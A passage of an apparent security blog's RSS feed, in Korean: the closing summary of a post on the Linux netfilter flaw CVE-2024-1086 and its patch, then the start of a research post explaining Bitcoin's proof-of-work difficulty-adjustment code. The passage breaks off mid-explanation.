&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C;, &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>nf_hook_slow()</code>&#xC5D0;&#xC11C; &#xD328;&#xD0B7;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xACE0;, &#xC798;&#xBABB;&#xB41C; verdict &#xAC12;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xC5B4; Use-After-Free(UAF)&#xC640; &#xC774;&#xC911; &#xD574;&#xC81C;(double-free) &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; verdict.code &#xAC12;&#xC744; &#xC9C1;&#xC811; &#xAC80;&#xC99D;&#xD558;&#xC5EC; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xAC12;&#xC5D0; &#xB300;&#xD574; &#xC624;&#xB958;&#xB97C; &#xBC18;&#xD658;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/cve-2024-1086">https://nvd.nist.gov/vuln/detail/cve-2024-1086</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Linux/">Linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/netfilter/">netfilter</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/12/romi0x/1day1line0312/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Five Consensus Algorithms in Blockchain [ko]</title>
      <link>https://hackyboiz.github.io/2025/03/09/bekim/consensus_algorithm/ko/</link>
      <guid>https://hackyboiz.github.io/2025/03/09/bekim/consensus_algorithm/ko/</guid>
      <pubDate>Sun, 09 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; bekim&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC804; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xBE14;&#xB85D;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xAC70;&#xB798;&#xB97C; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xAC83;&#xC774; &#x201C;Proof of Work&#x201D;&#xC784;&#xC744; &#xC9E7;&#xAC8C; &#xC54C;&#xB824;&#xB4DC;&#xB838;&#xC8E0;? &#xC0AC;&#xC2E4; &#xC774; &#xACFC;&#xC815;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; PoW &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC5B4;&#xC694;. &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;(Consensus Algorithm)&#xC774;&#xB780;, &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xCC38;&#xC5EC;&#xC790;&#xB4E4;&#xC774; &#xD558;&#xB098;&#xC758; &#xC720;&#xD6A8;&#xD55C; &#xBE14;&#xB85D;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xACE0;, &#xD574;&#xB2F9; &#xCCB4;&#xC778;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xB9D0;&#xD574;&#xC694;.<br>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xADF8; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC778; PoS, PoW&#xC640; DPoS, PBFT, Hybrid PoW/PoS&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/09/bekim/consensus_algorithm/ko/image.png" alt></p><h1 id="1-Proof-of-Work-PoW"><a href="#1-Proof-of-Work-PoW" class="headerlink" title="1. Proof of Work  (PoW)"></a>1. Proof of Work  (PoW)</h1><p>&#xC800;&#xBC88;&#xC5D0; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xB358; &#xC791;&#xC5C5; &#xC99D;&#xBA85;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xB4DC;&#xB9AC;&#xBA74;, &#xC791;&#xC5C5;&#xC99D;&#xBA85;&#xC740; &#xCC44;&#xAD74;&#xC790;&#xAC00; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xC5EC; &#xD2B9;&#xC815; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xD574;&#xC2DC; &#xAC12;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBC29;&#xC2DD;&#xC740; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC5D0;&#xC11C; &#xCC98;&#xC74C; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xCC44;&#xAD74;&#xC790;&#xB294; Nonce &#xAC12;&#xC744; &#xC870;&#xC815;&#xD558;&#xBA70; &#xBAA9;&#xD45C; &#xD574;&#xC2DC; &#xAC12;&#xC744; &#xCC3E;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBC18;&#xBCF5;&#xD574;&#xC57C; &#xD574;&#xC694;.<br>&#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC740; &#xD3C9;&#xADE0; 10&#xBD84;&#xB9C8;&#xB2E4; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xB370;, &#xC774;&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB294; &#xC57D; 2&#xC8FC;(2016&#xAC1C; &#xBE14;&#xB85D;)&#xB9C8;&#xB2E4; &#xB09C;&#xC774;&#xB3C4;(Difficulty)&#xB97C; &#xC870;&#xC815;&#xD574;&#xC694;.</p><p>&#xC2E4;&#xC81C; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC758; &#xCD5C;&#xC2E0; &#xAD6C;&#xD604;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C;, PoW&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GetNextWorkRequired</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CBlockIndex* pindexLast, <span class="hljs-keyword">const</span> CBlockHeader *pblock, <span class="hljs-keyword">const</span> Consensus::Params&amp; params)</span></span><span class="hljs-function"></span>{    assert(pindexLast != <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nProofOfWorkLimit = UintToArith256(params.powLimit).GetCompact();<span class="hljs-comment">// Only change once per difficulty adjustment interval</span>    <span class="hljs-comment">// [1] </span>    <span class="hljs-keyword">if</span> ((pindexLast-&gt;nHeight+<span class="hljs-number">1</span>) % params.DifficultyAdjustmentInterval() != <span class="hljs-number">0</span>)    {        <span class="hljs-keyword">if</span> (params.fPowAllowMinDifficultyBlocks)        {            <span class="hljs-comment">// Special difficulty rule for testnet:</span>            <span class="hljs-comment">// If the new block&apos;s timestamp is more than 2* 10 minutes</span>            <span class="hljs-comment">// then allow mining of a min-difficulty block.</span>            <span class="hljs-comment">// [2]</span>            <span class="hljs-keyword">if</span> (pblock-&gt;GetBlockTime() &gt; pindexLast-&gt;GetBlockTime() + params.nPowTargetSpacing*<span class="hljs-number">2</span>)                <span class="hljs-keyword">return</span> nProofOfWorkLimit;            <span class="hljs-keyword">else</span>            {                <span class="hljs-comment">// Return the last non-special-min-difficulty-rules-block</span>                <span class="hljs-comment">// [3]</span>                <span class="hljs-keyword">const</span> CBlockIndex* pindex = pindexLast;                <span class="hljs-keyword">while</span> (pindex-&gt;pprev &amp;&amp; pindex-&gt;nHeight % params.DifficultyAdjustmentInterval() != <span class="hljs-number">0</span> &amp;&amp; pindex-&gt;nBits == nProofOfWorkLimit)                    pindex = pindex-&gt;pprev;                <span class="hljs-keyword">return</span> pindex-&gt;nBits;            }        }        <span class="hljs-comment">// [4]</span>        <span class="hljs-keyword">return</span> pindexLast-&gt;nBits;    }    <span class="hljs-comment">// Go back by what we want to be 14 days worth of blocks</span>    <span class="hljs-comment">// [5]</span>    <span class="hljs-keyword">int</span> nHeightFirst = pindexLast-&gt;nHeight - (params.DifficultyAdjustmentInterval()<span class="hljs-number">-1</span>);    assert(nHeightFirst &gt;= <span class="hljs-number">0</span>);    <span class="hljs-keyword">const</span> CBlockIndex* pindexFirst = pindexLast-&gt;GetAncestor(nHeightFirst);    assert(pindexFirst);    <span class="hljs-keyword">return</span> CalculateNextWorkRequired(pindexLast, pindexFirst-&gt;GetBlockTime(), params);}</code></pre><p>[1] &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC740; 2016&#xAC1C; &#xBE14;&#xB85D;&#xB9C8;&#xB2E4; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xC870;&#xC815;&#xD574;&#xC694;. &#xB9CC;&#xC57D; &#xB2E4;&#xC74C; &#xBE14;&#xB85D;&#xC758; &#xB192;&#xC774;(<code>pindexLast-&gt;nHeight+1</code>)&#xAC00; 2016(<code>params.DifficultyAdjustmentInterval()</code>) &#xC758; &#xBC30;&#xC218;&#xAC00; &#xC544;&#xB2C8;&#xB77C;&#xBA74; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xAE30;&#xC874; &#xBE14;&#xB85D;&#xC758; &#xB09C;&#xC774;&#xB3C4;(<code>pindexLast-&gt;nBits</code>)[4]&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>[2] &#xC774; &#xB54C;, Testnet &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294;, &#xC774;&#xC804; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB41C; &#xD6C4; &#xBAA9;&#xD45C;&#xC2DC;&#xAC04;(10&#xBD84;)&#xC758; 2&#xBC30;&#xC778; 20&#xBD84; &#xC774;&#xC0C1;&#xC774; &#xC9C0;&#xB098;&#xB3C4;&#xB85D; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xCD5C;&#xC18C;&#xAC12;(nProofOfWorkLimit)&#xC73C;&#xB85C; &#xC870;&#xC815;&#xD558;&#xB294; &#xC608;&#xC678; &#xADDC;&#xCE59;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xB294;&#xB370;&#xC694;.</p><p>[3] Testnet&#xC5D0;&#xC11C; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xCD5C;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xC870;&#xC815;&#xD588;&#xB354;&#xB77C;&#xB3C4;, &#xC774;&#xD6C4; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xBA74; &#xB2E4;&#xC2DC; &#xC6D0;&#xB798; &#xB09C;&#xC774;&#xB3C4;&#xB85C; &#xBCF5;&#xADC0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC774;&#xC804; &#xBE14;&#xB85D;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA70; &#xAC00;&#xC7A5; &#xCD5C;&#xADFC;&#xC758; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xAC00;&#xC9C4; &#xBE14;&#xB85D;&#xC744; &#xCC3E;&#xC544; &#xADF8; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xC720;&#xC9C0;&#xD574;&#xC694;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> CBlockIndex* pindex = pindexLast;<span class="hljs-keyword">while</span> (pindex-&gt;pprev &amp;&amp; pindex-&gt;nHeight % params.DifficultyAdjustmentInterval() != <span class="hljs-number">0</span> &amp;&amp; pindex-&gt;nBits == nProofOfWorkLimit)    pindex = pindex-&gt;pprev;<span class="hljs-keyword">return</span> pindex-&gt;nBits;</code></pre><p>&#xC774;&#xB97C; &#xC704;&#xD574; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC740; &#xAC00;&#xC7A5; &#xCD5C;&#xADFC;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xBE14;&#xB85D;(<code>pindexLast</code>)&#xC744; &#xC2DC;&#xC791;&#xC810;&#xC73C;&#xB85C;, &#xC774;&#xC804; &#xBE14;&#xB85D;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA70;(<code>while (pindex-&gt;pprev)</code>) &#xAC00;&#xC7A5; &#xCD5C;&#xADFC;&#xC758; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xAC00;&#xC9C4; &#xBE14;&#xB85D;&#xC744; &#xCC3E;&#xC544; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xC720;&#xC9C0;&#xD574;&#xC694;.<br>&#xC989;, &#xCD5C;&#xC18C; &#xB09C;&#xC774;&#xB3C4;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xBE14;&#xB85D;&#xB4E4;&#xC740; &#xAC74;&#xB108; &#xB6F0;&#xACE0;(<code>pindex-&gt;nBits == nProofOfWorkLimit</code>), &#xB09C;&#xC774;&#xB3C4; &#xC870;&#xC815; &#xC8FC;&#xAE30;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBE14;&#xB85D;&#xB4E4;&#xC744; &#xD0D0;&#xC0C9;&#xD558;&#xB2E4;&#xAC00;(<code>pindex-&gt;nHeight % params.DifficultyAdjustmentInterval() != 0</code>), &#xB09C;&#xC774;&#xB3C4; &#xC870;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xBE14;&#xB85D;&#xC744; &#xB9CC;&#xB098;&#xBA74; &#xD0D0;&#xC0C9;&#xC744; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[5] &#xD558;&#xC9C0;&#xB9CC;, &#xD604;&#xC7AC; &#xBE14;&#xB85D;&#xC758; &#xB192;&#xC774;(<code>pindexLast-&gt;nHeight</code>)&#xAC00;  &#xB09C;&#xC774;&#xB3C4; &#xC870;&#xC815; &#xC8FC;&#xAE30;(2016&#xAC1C;&#xC758; &#xBC30;&#xC218;)&#xC5D0; &#xB3C4;&#xB2EC;&#xD588;&#xC744; &#xACBD;&#xC6B0;, &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xC870;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><hr><p>&#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xC804; 2016&#xAC1C; &#xBE14;&#xB85D;&#xC774; &#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xBE68;&#xB9AC; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xB192;&#xC774;&#xACE0;, &#xB290;&#xB9AC;&#xAC8C; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xB0AE;&#xCD94;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.<br><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">CalculateNextWorkRequired</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CBlockIndex* pindexLast, <span class="hljs-keyword">int64_t</span> nFirstBlockTime, <span class="hljs-keyword">const</span> Consensus::Params&amp; params)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (params.fPowNoRetargeting)        <span class="hljs-keyword">return</span> pindexLast-&gt;nBits;    <span class="hljs-comment">// Limit adjustment step</span>    <span class="hljs-comment">// [1]</span>    <span class="hljs-keyword">int64_t</span> nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime;    <span class="hljs-comment">// [2]</span>    <span class="hljs-keyword">if</span> (nActualTimespan &lt; params.nPowTargetTimespan/<span class="hljs-number">4</span>)        nActualTimespan = params.nPowTargetTimespan/<span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (nActualTimespan &gt; params.nPowTargetTimespan*<span class="hljs-number">4</span>)        nActualTimespan = params.nPowTargetTimespan*<span class="hljs-number">4</span>;    <span class="hljs-comment">// Retarget</span>    <span class="hljs-keyword">const</span> arith_uint256 bnPowLimit = UintToArith256(params.powLimit);    arith_uint256 bnNew;    <span class="hljs-comment">// Special difficulty rule for Testnet4</span>    <span class="hljs-comment">// [3]</span>    <span class="hljs-keyword">if</span> (params.enforce_BIP94) {        <span class="hljs-comment">// Here we use the first block of the difficulty period. This way</span>        <span class="hljs-comment">// the real difficulty is always preserved in the first block as</span>        <span class="hljs-comment">// it is not allowed to use the min-difficulty exception.</span>        <span class="hljs-keyword">int</span> nHeightFirst = pindexLast-&gt;nHeight - (params.DifficultyAdjustmentInterval()<span class="hljs-number">-1</span>);        <span class="hljs-keyword">const</span> CBlockIndex* pindexFirst = pindexLast-&gt;GetAncestor(nHeightFirst);        bnNew.SetCompact(pindexFirst-&gt;nBits);    } <span class="hljs-keyword">else</span> {        bnNew.SetCompact(pindexLast-&gt;nBits);    }<span class="hljs-comment">// [4]</span>    bnNew *= nActualTimespan;    bnNew /= params.nPowTargetTimespan;<span class="hljs-comment">// [5]</span>    <span class="hljs-keyword">if</span> (bnNew &gt; bnPowLimit)        bnNew = bnPowLimit;    <span class="hljs-keyword">return</span> bnNew.GetCompact();}</code></pre></p><p>[1] &#xBA3C;&#xC800;, &#xCD5C;&#xADFC; &#xBE14;&#xB85D;&#xC758; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504;(<code>pindexLast-&gt;GetBlockTime()</code>)&#xC640; &#xC774;&#xC804; 2016&#xAC1C; &#xBE14;&#xB85D;&#xC758; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504;(<code>nFirstBlockTime</code>)&#xC744; &#xBE44;&#xAD50;&#xD558;&#xC5EC;, &#xC774;&#xC804; 2016&#xAC1C; &#xBE14;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xB294;&#xB370; &#xAC78;&#xB9B0; &#xC2E4;&#xC81C; &#xC2DC;&#xAC04;&#xC744; <code>nActualTimespan</code> &#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.&#xC774; &#xAC12;&#xC740; &#xC774;&#xD6C4; &#xB09C;&#xC774;&#xB3C4; &#xC870;&#xC815;&#xC744; &#xC704;&#xD55C; &#xAE30;&#xC900;&#xC774; &#xB3FC;&#xC694;.<br><pre><code class="hljs cpp"><span class="hljs-keyword">int64_t</span> nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime;</code></pre></p><p>[2] &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC740; nActualTimespan&#xC744; &#xCE21;&#xC815;&#xD574; &#xBAA9;&#xD45C; &#xC2DC;&#xAC04;(<code>params.nPowTargetTimespan</code>)&#xACFC; &#xBE44;&#xAD50;&#xD55C; &#xD6C4; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xC870;&#xC815;&#xD558;&#xB294;&#xB370;, &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xAE09;&#xACA9;&#xD558;&#xAC8C; &#xBCC0;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBAA9;&#xD45C; &#xC2DC;&#xAC04;&#xC758; 1/4&#xBC30;&#xAE4C;&#xC9C0; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xAC70;&#xB098;, 4&#xBC30;&#xAE4C;&#xC9C0; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xAC10;&#xC18C;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;&#xD574;&#xC694;.<br><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (nActualTimespan &lt; params.nPowTargetTimespan/<span class="hljs-number">4</span>)    nActualTimespan = params.nPowTargetTimespan/<span class="hljs-number">4</span>;<span class="hljs-keyword">if</span> (nActualTimespan &gt; params.nPowTargetTimespan*<span class="hljs-number">4</span>)    nActualTimespan = params.nPowTargetTimespan*<span class="hljs-number">4</span>;</code></pre><br>&#xC774;&#xB7EC;&#xD55C; &#xC81C;&#xD55C;&#xC744; &#xB450;&#xBA74; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xAE09;&#xACA9;&#xD55C; &#xBCC0;&#xB3D9;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800;, &#xB09C;&#xC774;&#xB3C4; &#xC870;&#xC815; &#xC2DC; &#xAE30;&#xC900;&#xC774; &#xB418;&#xB294; &#xBE14;&#xB85D;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC740; <code>params.enforce_BIP94</code> &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xADDC;&#xCE59;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xB294; &#xACBD;&#xC6B0;,&#xD604;&#xC7AC; &#xBE14;&#xB85D;&#xC5D0;&#xC11C; 2016&#xAC1C; &#xC774;&#xC804; &#xBE14;&#xB85D;(<code>pindexFirst</code>)&#xC758; &#xB09C;&#xC774;&#xB3C4;(<code>pindexFirst-&gt;nBits</code>)&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xCD5C;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xB0AE;&#xCD94;&#xB294; &#xC608;&#xC678;&#xC801;&#xC778; &#xC0C1;&#xD669;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD604;&#xC7AC; &#xBE14;&#xB85D;&#xC758; &#xB09C;&#xC774;&#xB3C4;(<code>pindexLast-&gt;nBits</code>)&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;<br>&#xC774;&#xB7EC;&#xD55C; &#xBC29;&#xC2DD;&#xC740; Testnet&#xACFC; &#xAC19;&#xC740; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB0AE;&#xC544;&#xC9C0;&#xB294; &#xD604;&#xC0C1;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (params.enforce_BIP94) {    <span class="hljs-comment">// Here we use the first block of the difficulty period. This way</span>    <span class="hljs-comment">// the real difficulty is always preserved in the first block as</span>    <span class="hljs-comment">// it is not allowed to use the min-difficulty exception.</span>    <span class="hljs-keyword">int</span> nHeightFirst = pindexLast-&gt;nHeight - (params.DifficultyAdjustmentInterval()<span class="hljs-number">-1</span>);    <span class="hljs-keyword">const</span> CBlockIndex* pindexFirst = pindexLast-&gt;GetAncestor(nHeightFirst);    bnNew.SetCompact(pindexFirst-&gt;nBits);} <span class="hljs-keyword">else</span> {    bnNew.SetCompact(pindexLast-&gt;nBits);}</code></pre></p><blockquote><p>BIP(Bitcoin Improvement Proposal): &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xAC1C;&#xC120;&#xC548;. BIP94&#xB294; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC758; &#xAC1C;&#xC120;&#xC548; &#xC911; &#xD558;&#xB098;&#xB85C;, &#xB09C;&#xC774;&#xB3C4; &#xC870;&#xC815; &#xC2DC; &#xD2B9;&#xC815; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;(Testnet4 &#xB4F1;)&#xC5D0;&#xC11C; &#xC608;&#xC678;&#xC801;&#xC73C;&#xB85C; &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xAE09;&#xACA9;&#xD788; &#xB0AE;&#xC544;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xADDC;&#xCE59;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><p>[4] &#xADF8; &#xD6C4;,  <code>nActualTimespa</code>n &#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xC0C8;&#xB85C;&#xC6B4; &#xB09C;&#xC774;&#xB3C4;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC740; &#xBAA9;&#xD45C; &#xBE14;&#xB85D; &#xC0DD;&#xC131; &#xC2DC;&#xAC04;&#xC744; 10&#xBD84;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0;, 2016&#xAC1C;&#xC758; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD588;&#xC744; &#xB54C; &#xBAA9;&#xD45C; &#xC2DC;&#xAC04;(<code>params.nPowTargetTimespan</code>)&#xC740; &#xC57D; 2&#xC8FC;(1209600&#xCD08;)&#xC785;&#xB2C8;&#xB2E4;. &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xC2E4;&#xC81C; &#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xC2DC;&#xAC04;&#xACFC; &#xBAA9;&#xD45C; &#xC2DC;&#xAC04;&#xC758; &#xBE44;&#xC728;&#xC744; &#xC801;&#xC6A9;&#xD574;&#xC11C; 